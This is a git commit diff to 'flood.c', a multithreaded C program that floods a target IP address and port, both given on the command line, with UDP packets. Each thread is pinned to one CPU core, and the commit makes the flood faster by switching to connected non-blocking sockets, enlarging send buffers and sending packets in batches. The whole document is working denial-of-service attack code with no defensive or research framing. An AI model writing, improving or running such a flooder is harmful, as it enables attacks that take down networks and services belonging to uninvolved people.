a6b38d253631dec3882e4328e623ef72404123ba
ehahmgamv-lgtm <ehahmgamv@gmail.com>
2026-03-21 13:06:14 +0300

    Update flood.c

--- flood.c
+++ flood.c
@@ -9,8 +9,9 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <fcntl.h>
 
-constexpr int VLEN = 1024;
+constexpr int VLEN = 512;
 constexpr int PAYLOAD_SIZE = 64;
 
 struct thread_args {
@@ -27,8 +28,11 @@ void* flood_thread(void* arg) {
     CPU_SET(args->core_id, &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
 
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) return nullptr;
+
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
 
     int optval = 1024 * 1024 * 10;
     setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));
@@ -37,6 +41,8 @@ void* flood_thread(void* arg) {
     target.sin_family = AF_INET;
     target.sin_port = htons(args->target_port);
     inet_pton(AF_INET, args->target_ip, &target.sin_addr);
+
+    connect(sock, (struct sockaddr*)&target, sizeof(target));
 
     char payload[PAYLOAD_SIZE];
     memset(payload, 0xFF, PAYLOAD_SIZE);
@@ -48,8 +54,8 @@ void* flood_thread(void* arg) {
         iov[i].iov_base = payload;
         iov[i].iov_len = PAYLOAD_SIZE;
 
-        msgs[i].msg_hdr.msg_name = &target;
-        msgs[i].msg_hdr.msg_namelen = sizeof(target);
+        msgs[i].msg_hdr.msg_name = nullptr;
+        msgs[i].msg_hdr.msg_namelen = 0;
         msgs[i].msg_hdr.msg_iov = &iov[i];
         msgs[i].msg_hdr.msg_iovlen = 1;
         msgs[i].msg_hdr.msg_control = nullptr;
@@ -68,8 +74,10 @@ int main(int argc, char *argv[]) {
     if (argc != 3) return 1;
 
     long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
-    pthread_t threads[num_cores];
-    struct thread_args targs[num_cores];
+    if (num_cores < 1) num_cores = 1;
+
+    pthread_t *threads = malloc(sizeof(pthread_t) * num_cores);
+    struct thread_args *targs = malloc(sizeof(struct thread_args) * num_cores);
 
     for (long i = 0; i < num_cores; i++) {
         strncpy(targs[i].target_ip, argv[1], 15);
@@ -84,5 +92,7 @@ int main(int argc, char *argv[]) {
         pthread_join(threads[i], nullptr);
     }
 
+    free(threads);
+    free(targs);
     return 0;
 }
